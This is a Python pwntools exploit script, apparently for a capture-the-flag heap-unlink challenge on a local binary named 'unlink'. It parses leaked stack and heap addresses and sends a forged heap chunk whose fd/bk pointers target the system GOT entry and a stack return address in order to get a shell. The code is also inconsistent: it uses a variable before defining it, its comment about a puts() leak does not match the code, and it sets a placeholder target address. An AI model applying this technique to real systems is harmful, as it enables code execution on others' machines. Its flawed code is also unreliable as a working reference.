#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("unlink")
# libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
b unlink
continue
'''
def start():
    io = process(elf.path)
    if args.GDB:
        gdb.attach(io, gdbscript=gs)
    return io

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"here is stack address leak: ")
stack = int(io.recvline(), 16)

# This binary leaks the heap start address.
io.recvuntil(b"here is heap address leak: ")
heap = int(io.recvline(), 16)
io.recvuntil(b"now that you have leaks, get shell!")
io.timeout = 0.1

# =============================================================================

print(f"Shell() address: {hex(elf.sym.shell)}")
print(f"Stack() address: {hex(stack)}")
print(f"Heap() address: {hex(heap)}")

shellcode = asm(f"push {shell_address}; ret")
system_got = elf.got.system 
print(f"system_got = {hex(system_got)}")
# addreses to switch: (ret address) <-> (address to heap contains shell() ptr )
# addreses to switch: (stack + 36) <-> (heap +8)
chunk_size = 24 # real is 32
fd = system_got
bk = stack+20-0x30+4
print(f"FD = {hex(fd)}, BK = {hex(bk)}")
# shell_address = 0x80484eb
shell_address = 0xdeadbeef
fake_size = 0x21
# io.send_raw(shellcode + p64*(chunk_size - len(shellcode)) + p64(fd) + p64(bk))
io.send(p32(shell_address) + cyclic(0x10) + p32(fake_size) + p32(fd) + p32(bk) + b"/bin/bash\0\n")

# =============================================================================

io.interactive()
